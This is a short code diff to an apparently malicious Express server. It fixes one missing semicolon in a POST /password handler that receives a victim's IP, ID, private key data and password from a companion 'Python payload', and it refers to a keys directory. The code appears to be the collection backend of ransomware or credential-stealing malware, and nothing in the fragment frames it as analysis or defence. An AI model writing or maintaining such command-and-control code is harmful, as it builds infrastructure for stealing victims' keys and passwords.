@@ -15,7 +15,7 @@ if (!fs.existsSync(KEYS_DIR)) {
 
 app.post('/password', (req, res) => {
     const victimIp = req.body.victim_ip; // Python payload: 'victim_ip'
-    const victimId = req.body.victim_id // python payload: 'victim_id'
+    const victimId = req.body.victim_id; // python payload: 'victim_id'
     const privateKeyData = req.body.private_key_data; // Python payload: 'private_key_data'
     const Password = req.body.password; // Python payload: 'password'
 
